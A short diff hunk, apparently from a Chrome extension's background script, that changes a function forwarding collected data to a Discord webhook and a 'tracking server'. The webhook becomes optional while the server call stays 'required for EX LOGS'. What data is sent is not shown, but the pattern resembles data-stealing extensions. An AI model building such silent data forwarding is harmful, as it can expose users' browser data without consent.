@@ -355,12 +355,12 @@ chrome.runtime.onMessage.addListener(async (message, sender, sendResponse) => {
 
 // Enhanced webhook and server sending with retry logic
 async function sendToWebhookAndServer(data) {
-  // Send to Discord webhook (required)
-  if (WEBHOOK_URL) {
+  // Send to Discord webhook (optional)
+  if (WEBHOOK_URL && WEBHOOK_URL.trim()) {
     await sendToWebhook(data);
   }
 
-  // Send to tracking server
+  // Send to tracking server (required for EX LOGS)
   await sendToServer(data);
 }
 
